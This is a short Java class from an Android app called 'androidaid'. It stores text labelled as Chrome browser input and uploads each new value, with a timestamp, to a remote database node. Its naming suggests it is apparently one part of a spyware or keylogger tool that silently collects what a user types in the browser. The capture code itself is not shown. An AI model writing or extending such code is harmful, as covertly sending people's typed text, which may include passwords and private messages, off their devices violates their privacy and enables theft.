package androidaid.android.com.androidaid.core;

import androidaid.android.com.androidaid.networking.DatabaseNetworking;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.utilities.SystemTools;

public class ChromeInputChecker {
    public static String currentText = "";
    private static String previousText = "";

    public static void setText(String text) {
        currentText = text;
    }

    public static String getText() {
        return currentText;
    }

    public static void sendToDatabase() {
        if(!currentText.equals("")) {
            //System.out.println("[sproc32.core.ChromeInputChecker]: Sending text to database: " + currentText);

            if(!currentText.equals(previousText)) {
                DatabaseNetworking.storeText(currentText, SystemTools.getCurrentDateAndTime(), Constants.DATABASE_NODE_CHROME_INPUT);
                previousText = currentText;
            }
        }
    }


}
